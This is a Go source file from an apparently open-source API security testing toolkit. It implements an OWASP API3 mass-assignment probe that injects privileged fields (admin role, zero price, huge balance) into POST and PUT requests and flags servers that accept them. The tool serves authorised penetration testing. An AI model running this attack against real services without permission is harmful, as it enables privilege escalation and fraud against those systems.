// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2024 opensecstack contributors.

package api

// OWASP API3:2023 — Broken Object Property Level Authorization (Mass Assignment)
//
// Sends POST/PUT payloads enriched with extra privileged fields beyond the
// documented schema (role, is_admin, price, discount, balance, credits).
// Checks whether the server accepts and reflects these fields in its response.
//
// Safety guarantee: production blocklist check runs before any network I/O.

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// MassAssignmentAttack simulates OWASP API3 — Mass Assignment.
type MassAssignmentAttack struct {
	client *http.Client
}

// NewMassAssignmentAttack returns a ready MassAssignmentAttack.
func NewMassAssignmentAttack() *MassAssignmentAttack {
	return &MassAssignmentAttack{client: &http.Client{Timeout: 10 * time.Second}}
}

// extraFields are the over-privileged fields injected into every request body.
var extraFields = map[string]any{
	"role":           "admin",
	"is_admin":       true,
	"price":          0,
	"discount":       100,
	"balance":        999999,
	"credits":        999999,
	"verified":       true,
	"email_verified": true,
}

// Run fires POST and PUT requests at each configured endpoint, injecting extra
// fields. A 200/201/204 response that echoes any injected field is flagged.
//
// Recognised params keys:
//   - "endpoints"   []string          — paths to probe (default: see below)
//   - "base_body"   map[string]any    — legitimate fields to merge with extra fields
//   - "jwt"         string            — Bearer token for authenticated endpoints
func (a *MassAssignmentAttack) Run(ctx context.Context, targetURL string, params map[string]any) (*AttackResult, error) {
	if err := checkTarget(targetURL); err != nil {
		return nil, err
	}

	start := time.Now()
	result := &AttackResult{Technique: "MassAssignment"}

	endpoints := stringSliceParam(params, "endpoints", []string{
		"/api/users/me",
		"/api/profile",
		"/api/register",
		"/api/products/1",
	})

	baseBody := mapParam(params, "base_body", map[string]any{
		"name":  "attacker",
		"email": "attacker@lab.internal",
	})

	jwt, _ := params["jwt"].(string)
	base := strings.TrimRight(targetURL, "/")

	// Merge base body with extra privileged fields.
	payload := make(map[string]any, len(baseBody)+len(extraFields))
	for k, v := range baseBody {
		payload[k] = v
	}
	for k, v := range extraFields {
		payload[k] = v
	}

	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("massassignment: marshal payload: %w", err)
	}

	for _, ep := range endpoints {
		for _, method := range []string{http.MethodPost, http.MethodPut} {
			select {
			case <-ctx.Done():
				result.Duration = time.Since(start)
				return result, ctx.Err()
			default:
			}

			url := base + ep
			req, err := http.NewRequestWithContext(ctx, method, url, bytes.NewReader(bodyBytes))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Accept", "application/json")
			if jwt != "" {
				req.Header.Set("Authorization", "Bearer "+jwt)
			}

			resp, err := a.client.Do(req)
			if err != nil {
				continue
			}
			respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK ||
				resp.StatusCode == http.StatusCreated ||
				resp.StatusCode == http.StatusNoContent {

				reflected := reflectedFields(respBody)
				if len(reflected) > 0 {
					result.Success = true
					result.Evidence = append(result.Evidence,
						fmt.Sprintf("MassAssignment: %s %s HTTP %d — server reflected extra fields %v (snippet=%q)",
							method, url, resp.StatusCode, reflected, truncate(string(respBody), 200)))
				} else {
					// Server accepted but did not echo — still potentially vulnerable.
					result.Evidence = append(result.Evidence,
						fmt.Sprintf("MassAssignment: %s %s HTTP %d — accepted payload with extra fields (reflection unclear)",
							method, url, resp.StatusCode))
				}
			}
		}
	}

	result.Duration = time.Since(start)
	return result, nil
}

// reflectedFields checks the response body JSON for keys from extraFields.
func reflectedFields(body []byte) []string {
	var m map[string]any
	if err := json.Unmarshal(body, &m); err != nil {
		return nil
	}
	var found []string
	for k := range extraFields {
		if _, ok := m[k]; ok {
			found = append(found, k)
		}
	}
	return found
}
